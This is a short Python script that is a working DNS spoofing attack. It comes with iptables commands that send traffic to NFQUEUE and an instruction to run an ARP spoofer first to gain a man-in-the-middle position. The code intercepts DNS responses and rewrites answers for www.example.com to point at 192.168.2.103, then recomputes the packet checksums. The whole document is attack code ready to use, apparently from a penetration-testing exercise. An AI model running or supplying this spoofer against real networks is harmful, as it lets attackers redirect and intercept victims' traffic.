

'''	iptables -I INPUT -j NFQUEUE --queue-num 0
	iptables -I OUTPUT -j NFQUEUE --queue-num 0
	iptables -I FORWARD -j NFQUEUE --queue-num 0
	iptables --flush

run arp_spoof.py to become man in the middle.	

'''

# !/usr/bin/env python

import scapy.all as scapy
import netfilterqueue

'''
NFQUEUE is an iptables and ip6tables target which delegate the decision on packets.
NetfilterQueue provides access to packets matched by an iptables rule in Linux. Packets so matched can be accepted, dropped, 
altered, or given a mark.

nfqueue-bindings is a set of high-level modules for several languages (Python and Perl, for the moment), 
for libnetfilter_queue. It provides a userspace API to access packets that have been queued by the kernel packet filter 
using the NFQUEUE target.

'''

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.example.com" in qname:
            print("[+] Target Spoofing")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.2.103")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

        # print(scapy_packet.show())
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()






